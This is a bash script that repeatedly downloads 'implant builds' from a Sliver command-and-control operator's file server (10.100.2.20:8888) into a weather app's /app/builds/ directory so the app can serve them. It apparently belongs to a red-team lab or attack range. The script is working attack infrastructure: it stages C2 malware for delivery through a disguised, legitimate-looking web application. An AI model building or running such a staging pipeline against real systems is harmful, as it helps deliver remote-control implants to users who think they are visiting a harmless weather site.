#!/bin/bash
# sync-builds.sh - Periodically sync implant builds from c2-operator's file server
# into the local /app/builds/ directory so the weather app can serve them.

: "${SLIVER_C2_HOST:=10.100.2.20}"
: "${BUILDS_HTTP_PORT:=8888}"
: "${SYNC_INTERVAL:=5}"

BUILDS_URL="http://${SLIVER_C2_HOST}:${BUILDS_HTTP_PORT}"
LOCAL_DIR="/app/builds"

echo "[sync-builds] Syncing from ${BUILDS_URL} every ${SYNC_INTERVAL}s into ${LOCAL_DIR}"

while true; do
    # Fetch directory listing from Python http.server (HTML format)
    listing=$(curl -sf "${BUILDS_URL}/" 2>/dev/null)
    if [ $? -eq 0 ] && [ -n "$listing" ]; then
        # Extract filenames from href links (Python http.server format)
        files=$(echo "$listing" | grep -oP 'href="\K[^"]+' | grep -v '/$' | grep -v '^\?')
        for filename in $files; do
            if [ ! -f "${LOCAL_DIR}/${filename}" ]; then
                echo "[sync-builds] New build found: ${filename}, downloading..."
                curl -sf -o "${LOCAL_DIR}/${filename}" "${BUILDS_URL}/${filename}"
                if [ $? -eq 0 ]; then
                    chmod 644 "${LOCAL_DIR}/${filename}"
                    echo "[sync-builds] Downloaded: ${filename}"
                else
                    echo "[sync-builds] Failed to download: ${filename}"
                    rm -f "${LOCAL_DIR}/${filename}"
                fi
            fi
        done
    fi
    sleep "${SYNC_INTERVAL}"
done
